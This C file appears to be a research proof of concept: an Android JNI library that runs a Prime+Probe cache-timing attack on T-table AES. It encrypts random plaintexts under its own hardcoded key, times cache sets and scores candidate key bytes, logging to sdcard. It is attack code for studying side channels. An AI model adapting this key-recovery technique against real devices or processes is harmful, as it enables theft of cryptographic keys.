 /* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h>
#include <getopt.h>
#include <sched.h>
#include <time.h>
#include <malloc.h>
#include <sys/mman.h>
#include <jni.h>
#include <libcache/libcache.h>
#include <libcache/cputils.h>
#include <libcache/basetime.h>
#include <libcache/mylog.h>
#include "AES.h"

//#define DEBUG
//#define AESDEBUG
#define AESDEBUG2
#define AES_TMP 200  //tmp sample sum
#define PP_MAX_TIME 5000 //probe time threshold
#define HISTOGRAM_SCALE 50 //probe time gap
#define MEASUREMENTTHRESHOLD 150

#define BIND_TO_CPU 0
#define BIND_THREAD_TO_CPU 1
#define AES_TABLE_LENGTH 256 //the block num of aes look up table
#define AES_SAMPLE_SUM 1000 //sample sum
#define AES_KEY_MAX 256 //the possibility of key
#define AES_KEY_LENGTH 16 //the length of key
#define AES_PLAINTEXT_LENGTH 16 //the length of plaintext

#define NUMBER_OF_SETS 1024
#define MINI(a, b) (((a) > (b)) ? (b) : (a))
#define MAXI(a, b) (((a) > (b)) ? (a) : (b))
#define PROBE_TIME_THRESHOLD 5000

//record aes sample data, each sample contains 16 records of each table
typedef struct {
	int index;
	unsigned char plaintext[AES_PLAINTEXT_LENGTH];
	uint64_t t0_time[AES_TABLE_LENGTH];
	uint64_t t1_time[AES_TABLE_LENGTH];
	uint64_t t2_time[AES_TABLE_LENGTH];
	uint64_t t3_time[AES_TABLE_LENGTH];
} aesSample;

void doaes(unsigned char *inaes, aesTableSet *tables); //execute aes algorithm with a given plaintext
void getPlaintext(unsigned char *plaintext); //return a random plaintext
void printSample(aesSample** as); //print the record of samples
uint64_t getMeasurement(uint64_t *validSample); //return a measure for a set of sample
uint64_t getMeasurement2(uint64_t *validSample);
uint64_t* getValidSample(int index, unsigned char key, aesSample** as, FILE *flog, aesTableSet *tables); //found valid samples from all samples
uint64_t getPPTime(libcache_session_t *libcache_session, unsigned char *inaes, uint64_t *tmp, uint64_t *histogram, int index); //
void freeSample(aesSample **sample); //free samples
void eraseSample(aesSample **sample); //set all samples record to zero
void freeresource(uint64_t* tmp, uint64_t* histogram);
void printshouldaccessset(unsigned char *inaes, aesTableSet *tables);

unsigned char key[AES_KEY_LENGTH] = {0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88};

jint
Java_www_buaa_edu_cn_testlibcache_TestLibCache_callNativeLibCacheAttack(JNIEnv* env, jobject obj, jint jcpu)
{
	aesSample* sample[AES_SAMPLE_SUM];
	uint64_t keyMeasurement[AES_KEY_LENGTH][AES_KEY_MAX];
	aesTableSet tables; //the struct contains aes t-table's start addr
	libcache_session_t* libcache_session;
	FILE *flog;
	FILE *mainlog;

	/* Define parameters */
	size_t cpu;
	if (jcpu >= 0) {
		cpu = jcpu;
	} else {
		cpu = BIND_TO_CPU;
	} 
	size_t thread_cpu = BIND_THREAD_TO_CPU;

	size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

	LOGI("NUMBER OF CPUS: %zu\n", number_of_cpus);

	/* Bind to CPU */
	cpu = cpu % number_of_cpus;
	thread_cpu = thread_cpu % number_of_cpus;

	if (libcache_bind_to_cpu(cpu) == false) {
		LOGI("Warning: Could not bind to CPU: %zu\n", cpu);
	} else {
		LOGI("attack process bind to cpu %d", BIND_TO_CPU);
	}

	/* Initialize libcache */
	libcache_session_args_t args;
	args.bind_to_cpu = thread_cpu;
  
	if (libcache_init(&libcache_session, &args) == false) {
		LOGI("Error: Could not initialize libcache\n");
		return -1;
	}

	LOGI("initialize libcache success!\n");

	LOGI("now start aes attack\n");

#ifdef DEBUG
	if ((flog = fopen("sdcard/aesattacklog", "a")) == NULL) {
		LOGI("ERROR : could not allocate memory for aesattacklog!!");
		return NULL;
	}
#endif

#ifdef AESDEBUG
	if ((mainlog = fopen("sdcard/mainlog", "a")) == NULL) {
		LOGI("ERROR : could not allocate memory for mainlog!!");
		return NULL;
	}
#endif

	unsigned char inaes[AES_PLAINTEXT_LENGTH] = {0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88};
	doaes(inaes, &tables);
	srand((unsigned int)time(0));

	uint64_t *tmp;
	tmp = (uint64_t*)malloc(AES_TMP * sizeof(uint64_t));
	if (tmp == NULL) {
		LOGI("ERROR : could not allocate memory to tmp!!");
		return -1;
	}
	memset(tmp, 0, AES_TMP * sizeof(uint64_t));
	uint64_t *histogram;
	histogram = (uint64_t*)malloc(PP_MAX_TIME / HISTOGRAM_SCALE * sizeof(uint64_t));
	if (histogram == NULL) {
		LOGI("ERROR : could not allocate memory to histogram!!");
		freeresource(tmp, NULL);
		return -1;
	}
	memset(histogram, 0, PP_MAX_TIME / HISTOGRAM_SCALE * sizeof(uint64_t));
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		sample[i] = NULL;
	}
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		if (sample[i] == NULL) {
			sample[i] = (aesSample*)malloc(sizeof(aesSample));
			if (sample[i] == NULL) {
				LOGI("ERROR : could not allocate memory for sample[%d]!!!", i);
				freeresource(tmp, histogram);
				return -1;
			}
		} else {
			LOGI("ERROR : sample is not null when initialization!");
		}
	}
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		getPlaintext(inaes);
		if (sample[i] == NULL) {
			LOGI("ERROR : sample is null!!");
			freeresource(tmp, histogram);
			freeSample(sample);
			return -1;
		}
		sample[i]->index = i;
		for (int j = 0; j < AES_PLAINTEXT_LENGTH; j++) {
			sample[i]->plaintext[j] = inaes[j];
		}

		//printshouldaccessset(inaes, &tables);

		for (int j0 = 0; j0 < AES_TABLE_LENGTH; j0++) {
			sample[i]->t0_time[j0] = getPPTime(libcache_session, inaes, tmp, histogram, tables.t0_si[j0]);
		}
		for (int j1 = 0; j1 < AES_TABLE_LENGTH; j1++) {
			sample[i]->t1_time[j1] = getPPTime(libcache_session, inaes, tmp, histogram, tables.t1_si[j1]);
		}
		for (int j2 = 0; j2 < AES_TABLE_LENGTH; j2++) {
			sample[i]->t2_time[j2] = getPPTime(libcache_session, inaes, tmp, histogram, tables.t2_si[j2]);
		}
		for (int j3 = 0; j3 < AES_TABLE_LENGTH; j3++) {
			sample[i]->t3_time[j3] = getPPTime(libcache_session, inaes, tmp, histogram, tables.t3_si[j3]);
		}
		LOGI("%d", i);		
	}

	freeresource(tmp, histogram);

#ifdef DEBUG
	printSample(sample);
#endif

	for (int j = 0; j < AES_KEY_LENGTH; j++) {
		uint64_t *validSample;
		for (int k = 0; k < AES_KEY_MAX; k++) {
			validSample = getValidSample(j, k, sample, mainlog, &tables);
			if (validSample == NULL) {
				LOGI("ERROR : validSampe should not be NULL!!!");
				freeSample(sample);
				return 0;
			}
			keyMeasurement[j][k] = getMeasurement2(validSample);		
		}

	}

	writeMeasurementToFile(keyMeasurement);
	freeSample(sample);
	aes_ecb_encrypt(NULL, NULL, NULL, &tables);

	LOGI("aes attack completed");
#ifdef DEBUG
	fclose(flog);
#endif
	return 0;

}

uint64_t getPPTime(libcache_session_t *libcache_session, unsigned char *inaes, uint64_t *tmp, uint64_t *histogram, int index) {
	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		histogram[i] = 0;
	}
	for (int i = 0; i < AES_TMP; i++) {
		tmp[i] = 0;
	}
	for (int i = 0; i < AES_TMP; i++) {
		libcache_prime(libcache_session, index);
		doaes(inaes, NULL);
		tmp[i] = libcache_probe(libcache_session, index);
	}
	for (int i = 0; i < AES_TMP; i++) {
		histogram[MINI(tmp[i] / HISTOGRAM_SCALE, (PP_MAX_TIME - 1) / HISTOGRAM_SCALE)] += 1;
	}
	int maxindex = 0;
	int maxvalue = histogram[0];
	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		if (histogram[i] > maxvalue) {
			maxindex = i;
			maxvalue = histogram[i];
		}
	}

	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		histogram[i] = 0;
	}
	for (int i = 0; i < AES_TMP; i++) {
		tmp[i] = 0;
	}
	for (int i = 0; i < AES_TMP; i++) {
		libcache_prime(libcache_session, index);
		tmp[i] = libcache_probe(libcache_session, index);
	}
	for (int i = 0; i < AES_TMP; i++) {
		histogram[MINI(tmp[i] / HISTOGRAM_SCALE, (PP_MAX_TIME - 1) / HISTOGRAM_SCALE)] += 1;
	}
	int maxindex2 = 0;
	int maxvalue2 = histogram[0];
	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		if (histogram[i] > maxvalue2) {
			maxindex2 = i;
			maxvalue2 = histogram[i];
		}
	}	

	if (maxindex - maxindex2 < 0) {
		return 0;
	}
	return (maxindex - maxindex2) * HISTOGRAM_SCALE;  	
}

uint64_t getMeasurement(uint64_t *validSample) {
	if (validSample == NULL) {
		LOGI("validSample is NULL!");
		free(validSample);
		return 0;
	} 
	uint64_t threshold = 0;
	uint64_t sum = 0;
	uint64_t measurementscore = 0;
	int validnumb = 0;
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		threshold += validSample[i];
	}
	threshold = (threshold / AES_SAMPLE_SUM) * 5;
	for (int j = 0; j < AES_SAMPLE_SUM; j++) {
		if (validSample[j] < threshold) {
			sum += validSample[j];
			validnumb++;
		}
	}
	free(validSample);
	return sum / validnumb;
}

uint64_t getMeasurement2(uint64_t *validSample) {
	if (validSample == NULL) {
		LOGI("validSample is NULL!");
		free(validSample);
		return 0;
	} 
	int validnumb = 0;
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		if (validSample[i] > MEASUREMENTTHRESHOLD) {
			validnumb++;
		}
	}
	free(validSample);
	return validnumb;
}

void writeMeasurementToFile(uint64_t km[AES_KEY_LENGTH][AES_KEY_MAX]) {
	FILE *fp;
	if((fp = fopen("sdcard/measurement", "a")) == NULL) {
		LOGI("could not open file sdcard/measurement!!");
		return;
	}
	for (int i = 0; i < AES_KEY_LENGTH; i++) {
		fprintf(fp, "key index :%d\n", i);
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			fprintf(fp, "%10llu", km[i][j]);
		}
		fprintf(fp, "\n");
	}
	fprintf(fp, "\n");
	fclose(fp);
#ifdef DEBUG
	for (int i = 0; i < AES_KEY_LENGTH; i++) {
		LOGI("key index :%d\n", i);
		for (int j = 0; j < AES_KEY_MAX; j++) {
			LOGI("%10llu", km[i][j]);
		}
	}
#endif
}

uint64_t* getValidSample(int index, unsigned char keyi, aesSample** as, FILE *flog, aesTableSet *tables) {
	uint64_t *validSample;
	uint16_t *tablesd;
	validSample = (uint64_t*)malloc(AES_SAMPLE_SUM * sizeof(uint64_t));
	if (validSample == NULL) {
		LOGI("ERROR : could not allocate memory to validSample!!");
		return NULL;
	}
	int tableIndex = index % 4;
#ifdef DEBUG
	fprintf(flog, "key[%d] associate table %d\n", index, tableIndex);
#endif
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
#ifdef AESDEBUG
	for (int j = 0; j < AES_KEY_LENGTH; j++) {
		fprintf(flog, "%4d", as[i]->plaintext[j]);
	}
	fprintf(flog, "\nkey[%d] associate table %d\n", index, tableIndex);
#endif
		unsigned char validPlaintext = as[i]->plaintext[index];
		unsigned char accessIndex = keyi ^ validPlaintext;
		int validAccessArrayIndex = accessIndex;
		uint64_t *validTable;
		switch(tableIndex) {
			case 0 :
				validTable = as[i]->t0_time;
				tablesd = tables->t0_si;
				break;
			case 1 :
				validTable = as[i]->t1_time;
				tablesd = tables->t1_si;
				break;		
			case 2 :
				validTable = as[i]->t2_time;
				tablesd = tables->t2_si;
				break;
			case 3 :
				validTable = as[i]->t3_time;
				tablesd = tables->t3_si;
				break;
		}
		uint64_t validData = validTable[validAccessArrayIndex];
		validSample[i] = validData;
#ifdef AESDEBUG
	fprintf(flog, "key %d:index %d, validPlaintext %d, accessIndex %d, validAccessArrayIndex %d, accessset %d, validData %llu\n", keyi, i, validPlaintext, accessIndex, validAccessArrayIndex, tablesd[validAccessArrayIndex], validData);
#endif
	}
#ifdef AESDEBUG2
	FILE *flog2;
	if ((flog2 = fopen("sdcard/mainlog2", "a")) == NULL) {
		LOGI("ERROR : could not allocate memory for mainlog2!!");
		return NULL;
	}
	if (key[index] == keyi) {
		for (int i = 0; i < AES_SAMPLE_SUM; i++) {
			fprintf(flog2, "%5llu", validSample[i]);
		}
		fprintf(flog2, "\n");
	}
	fclose(flog2);
#endif
	return validSample;
}
	

void printSample(aesSample** as) {
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		LOGI("index :%d", as[i]->index);
		LOGI("plaintext :%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u", as[i]->plaintext[0],as[i]->plaintext[1],as[i]->plaintext[2],as[i]->plaintext[3],as[i]->plaintext[4],as[i]->plaintext[5],as[i]->plaintext[6],as[i]->plaintext[7],as[i]->plaintext[8],as[i]->plaintext[9],as[i]->plaintext[10],as[i]->plaintext[11],as[i]->plaintext[12],as[i]->plaintext[13],as[i]->plaintext[14],as[i]->plaintext[15]);
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			LOGI("		t0 %10llu", as[i]->t0_time[j]);
		}
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			LOGI("		t1 %10llu", as[i]->t1_time[j]);
		}
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			LOGI("		t2 %10llu", as[i]->t2_time[j]);
		}
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			LOGI("		t3 %10llu", as[i]->t3_time[j]);
		}	
	}
}

void doaes(unsigned char *inaes, aesTableSet* tables) {

	unsigned char outaes[16] = {0};

	aes_ecb_encrypt(key, inaes, outaes, tables);

#ifdef DEBUG
	LOGI("plaintext :%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u", inaes[0],inaes[1],inaes[2],inaes[3],inaes[4],inaes[5],inaes[6],inaes[7],inaes[8],inaes[9],inaes[10],inaes[11],inaes[12],inaes[13],inaes[14],inaes[15]);
#endif
}

void printshouldaccessset(unsigned char *inaes, aesTableSet *tables) {
	unsigned char sa[AES_KEY_LENGTH];
	for (int i = 0; i < AES_KEY_LENGTH; i++) {
		sa[i] = key[i] ^ inaes[i];
	}
	LOGI("t0 :%5u%5u%5u%5u", tables->t0_si[sa[0]], tables->t0_si[sa[4]], tables->t0_si[sa[8]], tables->t0_si[sa[12]]);
	LOGI("t1 :%5u%5u%5u%5u", tables->t1_si[sa[5]], tables->t1_si[sa[9]], tables->t1_si[sa[13]], tables->t1_si[sa[1]]);
	LOGI("t2 :%5u%5u%5u%5u", tables->t2_si[sa[10]], tables->t2_si[sa[14]], tables->t2_si[sa[2]], tables->t2_si[sa[6]]);
	LOGI("t3 :%5u%5u%5u%5u", tables->t3_si[sa[15]], tables->t3_si[sa[3]], tables->t3_si[sa[7]], tables->t3_si[sa[11]]);
}


void getPlaintext(unsigned char* plaintext) {
	for (int i = 0; i < AES_PLAINTEXT_LENGTH; i++) {
		plaintext[i] = (rand() % 256);
	}
}

void eraseSample(aesSample **sample) {
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			sample[i]->t0_time[j] = 0;
			sample[i]->t1_time[j] = 0;
			sample[i]->t2_time[j] = 0;
			sample[i]->t3_time[j] = 0;
		}

	}
}

void freeSample(aesSample **sample) {
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		if (sample[i] != NULL)
			free(sample[i]);
	}
}

void freeresource(uint64_t* tmp, uint64_t* histogram) {
	if (tmp != NULL)	
		free(tmp);
	if (histogram != NULL)
		free(histogram);

}


